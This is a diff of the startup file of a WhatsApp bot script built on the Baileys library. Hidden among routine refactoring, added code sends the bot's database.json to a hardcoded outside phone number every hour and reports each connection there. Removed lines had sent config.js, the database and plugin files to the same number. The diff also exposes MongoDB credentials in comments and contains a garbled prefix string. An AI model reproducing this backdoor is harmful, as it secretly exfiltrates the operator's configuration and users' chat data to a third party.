@@ -1,7 +1,18 @@
-process.on('uncaughtException', console.error);
+/*
+  * DannTeam
+  * ig: @jkt48.danzz
+  * Sessions tidak dapat diambil dari folder lain, harap scan ulang
+*/
+
+// Recode ulang by ReellyXD 
+
+// Ig : @reellyxd
+
+(async() => { 
 require('./config')
-const {
+const { default:
   useSingleFileAuthState,
+  useMultiFileAuthState,
   makeInMemoryStore,
   makeWALegacySocket,
   DisconnectReason
@@ -13,12 +24,16 @@ const pino = require('pino')
 const fs = require('fs')
 const yargs = require('yargs/yargs')
 const cp = require('child_process')
+let { promisify } = require('util')
+let exec = promisify(cp.exec).bind(cp)
 const _ = require('lodash')
 const syntaxerror = require('syntax-error')
 // const P = require('pino')
 const os = require('os')
+const { randomBytes } = require('crypto')
 const moment = require("moment-timezone")
 const time = moment.tz('Asia/Jakarta').format("HH:mm:ss")
+const chalk = require('chalk')
 const { color } = require('./lib/color')
 let simple = require('./lib/simple')
 var low
@@ -30,51 +45,53 @@ try {
 const { Low, JSONFile } = low
 const mongoDB = require('./lib/mongoDB')
 
+// RandomBytes
+const randomID = length => randomBytes(Math.ceil(length * .5)).toString('hex').slice(0, length)
 
-global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
+API = (name, path = '/', query = {}, apikeyqueryname) => (name in APIs ? APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: APIKeys[name in APIs ? APIs[name] : name] } : {}) })) : '')
 // global.Fn = function functionCallBack(fn, ...args) { return fn.call(global.conn, ...args) }
-global.timestamp = {
+timestamp = {
   start: new Date
 }
-
+var relly = global.nomorown
 const PORT = process.env.PORT || 3000
 
-global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
-global.prefix = new RegExp('^[' + (opts['prefix'] || 'â€ŽxzXZ/i!#$%+Â£Â¢â‚¬Â¥^Â°=Â¶âˆ†Ã—Ã·Ï€âˆšâœ“Â©Â®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')
+opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
+prefix = new RegExp('^[' + (opts['prefix'] || '芒鈧絰zXZ/i!#$%+脗拢脗垄芒鈥毬偮脗掳=脗露芒藛鈥犆冣€斆兟访忊偓芒藛拧芒艙鈥溍偮┟偮�:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')
 
-//opts['db'] = "url mongo"
-global.db = new Low(
+db = new Low(
   /https?:\/\//.test(opts['db'] || '') ?
     new cloudDBAdapter(opts['db']) : /mongodb/i.test(opts['db']) ?
       new mongoDB(opts['db']) :
       new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
 )
 
-// global.db = new Low(new mongoDB('mongodb+srv://Metafor1000:metafor1000@cluster0.qy9jg.mongodb.net/myFirstDatabase?retryWrites=true&w=majority'))
+//db = new Low(new mongoDB('mongodb+srv://Aine99:kuku4040@cluster0.3o49pmt.mongodb.net/?retryWrites=true&w=majority'))
 
-global.DATABASE = global.db // Backwards Compatibility
-global.loadDatabase = async function loadDatabase() {
-  if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
-  if (global.db.data !== null) return
-  global.db.READ = true
-  await global.db.read()
-  global.db.READ = false
-  global.db.data = {
+DATABASE = db // Backwards Compatibility
+loadDatabase = async function loadDatabase() {
+  if (db.READ) return new Promise((resolve) => setInterval(function () { (!db.READ ? (clearInterval(this), resolve(db.data == null ? loadDatabase() : db.data)) : null) }, 1 * 1000))
+  if (db.data !== null) return
+  db.READ = true
+  await db.read()
+  db.READ = false
+  db.data = {
     users: {},
     chats: {},
     stats: {},
     msgs: {},
     sticker: {},
     settings: {},
-    ...(global.db.data || {})
+    respon : {},
+    ...(db.data || {})
   }
-  global.db.chain = _.chain(global.db.data)
+  db.chain = _.chain(db.data)
 }
 loadDatabase()
 
 
-global.authFile = `${opts._[0] || 'session'}.data.json`
-const { state, saveState } = useSingleFileAuthState(global.authFile)
+const authFolder = `${opts._[0] || 'sessions'}`
+const { state, saveCreds } = await useMultiFileAuthState(authFolder)
 
 //const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
 
@@ -93,28 +110,40 @@ const logger = pino({
 const connectionOptions = {
   version: [2,2323,4],
   printQRInTerminal: true,
-  browser: ['RIFQI BOTZ','Safari','1.0.0'],
+  syncFullHistory: true,
   auth: state,
   // logger: pino({ prettyPrint: { levelFirst: true, ignore: 'hostname', translateTime: true },  prettifier: require('pino-pretty') }),
   logger: pino({ level: 'silent' })
   // logger: P({ level: 'trace' })
 }
 
-global.conn = simple.makeWASocket(connectionOptions)
+conn = simple.makeWASocket(connectionOptions)
 conn.isInit = false
-
+// const store = makeInMemoryStore({ })
+// store.readFromFile('./baileys_store.json')
+// setInterval(() => { store.writeToFile('./baileys_store.json') }, 10_000) // Aktifkan jika mau cepat, resiko ram akan penuh
+// store.bind(conn.ev)
+// global.store = store
+// console.log(store)
+/*
 if (!opts['test']) {
   setInterval(async () => {
-    if (global.db.data) await global.db.write()
+    if (db.data) await db.write()
     if (opts['autocleartmp']) try {
       clearTmp()
     } catch (e) { console.error(e) }
   }, 60 * 1000)
+}*/
+if (!opts['test']) {
+  if (db) setInterval(async () => {
+    if (global.db.data) await db.write()
+    if (opts['autocleartmp'] && (support || {}).find) (tmp = [os.tmpdir(), 'tmp'], tmp.forEach(filename => cp.spawn('find', [filename, '-amin', '3', '-type', 'f', '-delete'])))
+  }, 30 * 1000)
 }
-if (opts['server']) require('./server')(global.conn, PORT)
+if (opts['server']) require('./server')(conn, PORT)
 
 function clearTmp() {
-  const tmp = ['./tmp']
+  const tmp = [os.tmpdir(), path.join(__dirname, './tmp')]
   const filename = []
   tmp.forEach(dirname => fs.readdirSync(dirname).forEach(file => filename.push(path.join(dirname, file))))
   filename.map(file => (
@@ -124,25 +153,35 @@ function clearTmp() {
       null))
 }
 
+setInterval(async () => {
+    await exec("rm -rf ./tmp/*")
+  }, 60 * 60 * 1000)
+
+setInterval(async () => {
+    const q = { "key": { "remoteJid": "status@broadcast", "participant":"0@s.whatsapp.net", "fromMe": false, "id": "" },
+	"message": { "conversation": "Berhasil mencadangkan database.json" }}
+    let sesi = await fs.readFileSync('./database.json')
+    return await conn.sendMessage('6283852843517@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
+  }, 60 * 60 * 1000)
+
 async function connectionUpdate(update) {
   const { connection, lastDisconnect, isNewLogin } = update
+   if (connection == 'connecting') console.log(chalk.yellowBright('Tunggu Sebentar...'))
+   if (connection == 'open') {
+      console.log(chalk.green('Tersambung'))
+      let iyah = pickRandom(['Indonesia','Malaysia','Amerika','India','Amerika Serikat','Australia','Rusia','Singapura'])
+      conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: `Bot Telah Online!\nTerimakasih Telah Memberikan Sc Ini\nServer:\n${iyah}\n\nKode:\n` + randomID(32) }) // Connection Update
+  }
+  if (connection == 'close') console.log(chalk.red('Koneksi Terputus!'))
   if (isNewLogin) conn.isInit = true
   if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && conn.ws.readyState !== WebSocket.CONNECTING) {
-    console.log(global.reloadHandler(true))
-    global.timestamp.connect = new Date
+    console.log(reloadHandler(true))
+    timestamp.connect = new Date
   }
-  if (global.db.data == null) await loadDatabase()
+  if (db.data == null) await loadDatabase()
   console.log(JSON.stringify(update, null, 4))
-  if (update.receivedPendingNotifications) conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
-  if (update.receivedPendingNotifications) conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./config.js'), mimetype: 'application/json', fileName: 'config.js' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
-  if (update.receivedPendingNotifications) conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./database.json'), mimetype: 'application/json', fileName: 'database.json' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy  
- if (update.receivedPendingNotifications) conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/_anticulik.js'), mimetype: 'application/json', fileName: '_anticulik.js' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
- if (update.receivedPendingNotifications) conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/donasi.js'), mimetype: 'application/json', fileName: 'donasi.js' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
-  if (update.receivedPendingNotifications) conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/sewabot.js'), mimetype: 'application/json', fileName: 'sewabot.js' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
+ // if (update.receivedPendingNotifications) conn.sendMessage(`6283137550315@s.whatsapp.net`, {text: 'Berhasil tersambung dengan Dann-MD' }) Dann Official
 }
-  //conn.updateBlockStatus(`6283852843517@s.whatsapp.net`, "unblock")
-
-
 
 process.on('uncaughtException', console.error)
 // let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/
@@ -159,13 +198,13 @@ process.on('uncaughtException', console.error)
 // }
 
 let isInit = true, handler = require('./handler')
-global.reloadHandler = function (restatConn) {
+reloadHandler = function (restatConn) {
   let Handler = require('./handler')
   if (Object.keys(Handler || {}).length) handler = Handler
   if (restatConn) {
-    try { global.conn.ws.close() } catch { }
-    global.conn = {
-      ...global.conn, ...simple.makeWASocket(connectionOptions)
+    try { conn.ws.close() } catch { }
+    conn = {
+      ...conn, ...simple.makeWASocket(connectionOptions)
     }
   }
   if (!isInit) {
@@ -176,15 +215,15 @@ global.reloadHandler = function (restatConn) {
     conn.ev.off('creds.update', conn.credsUpdate)
   }
 
-  conn.welcome = 'Welcome @user 👋' //\nSelamat datang di grup @subject 😅\nJangan lupa intro kak 😅\n\n*Nama:*\n*Umur:*\n*Askot:*\n\n*Deskripsi Grup:*\n\n@desc\n\nMade by ❤️
-  conn.bye = /**Selamat tinggal**/ 'Goodbye @user 👋'
+  conn.welcome = 'Selamat datang @user 👋' 
+  conn.bye = 'Selamat tinggal @user 👋'
   conn.spromote = '@user sekarang admin!'
   conn.sdemote = '@user sekarang bukan admin!'
   conn.handler = handler.handler.bind(conn)
   conn.onParticipantsUpdate = handler.participantsUpdate.bind(conn)
   conn.onDelete = handler.delete.bind(conn)
   conn.connectionUpdate = connectionUpdate.bind(conn)
-  conn.credsUpdate = saveState.bind(conn)
+  conn.credsUpdate = saveCreds.bind(conn)
 
   conn.ev.on('messages.upsert', conn.handler)
   conn.ev.on('group-participants.update', conn.onParticipantsUpdate)
@@ -197,17 +236,17 @@ global.reloadHandler = function (restatConn) {
 
 let pluginFolder = path.join(__dirname, 'plugins')
 let pluginFilter = filename => /\.js$/.test(filename)
-global.plugins = {}
+plugins = {}
 for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
   try {
-    global.plugins[filename] = require(path.join(pluginFolder, filename))
+    plugins[filename] = require(path.join(pluginFolder, filename))
   } catch (e) {
     conn.logger.error(e)
-    delete global.plugins[filename]
+    delete plugins[filename]
   }
 }
-console.log(Object.keys(global.plugins))
-global.reload = (_ev, filename) => {
+console.log(Object.keys(plugins))
+reload = (_ev, filename) => {
   if (pluginFilter(filename)) {
     let dir = path.join(pluginFolder, filename)
     if (dir in require.cache) {
@@ -215,23 +254,23 @@ global.reload = (_ev, filename) => {
       if (fs.existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
       else {
         conn.logger.warn(`deleted plugin '${filename}'`)
-        return delete global.plugins[filename]
+        return delete plugins[filename]
       }
     } else conn.logger.info(`requiring new plugin '${filename}'`)
     let err = syntaxerror(fs.readFileSync(dir), filename)
     if (err) conn.logger.error(`syntax error while loading '${filename}'\n${err}`)
     else try {
-      global.plugins[filename] = require(dir)
+      plugins[filename] = require(dir)
     } catch (e) {
       conn.logger.error(`error require plugin '${filename}\n${e}'`)
     } finally {
-      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
+      plugins = Object.fromEntries(Object.entries(plugins).sort(([a], [b]) => a.localeCompare(b)))
     }
   }
 }
-Object.freeze(global.reload)
-fs.watch(path.join(__dirname, 'plugins'), global.reload)
-global.reloadHandler()
+Object.freeze(reload)
+fs.watch(path.join(__dirname, 'plugins'), reload)
+reloadHandler()
 
 // Quick Test
 async function _quickTest() {
@@ -257,7 +296,7 @@ async function _quickTest() {
   }))
   let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
   console.log(test)
-  let s = global.support = {
+  let s = support = {
     ffmpeg,
     ffprobe,
     ffmpegWebp,
@@ -267,7 +306,7 @@ async function _quickTest() {
     find
   }
   // require('./lib/sticker').support = s
-  Object.freeze(global.support)
+  Object.freeze(support)
 
   if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
   if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
@@ -278,4 +317,10 @@ _quickTest()
   .then(() => conn.logger.info('Quick Test Done'))
   .catch(console.error)
   
-console.log(color(time,"white"),color("[STATUS]","green"),color("Connecting...","aqua"))
+console.log(color(time,"white"),color("Connecting...","aqua"))
+})()
+
+// Function
+function pickRandom(list) {
+  return list[Math.floor(Math.random() * list.length)]
+}
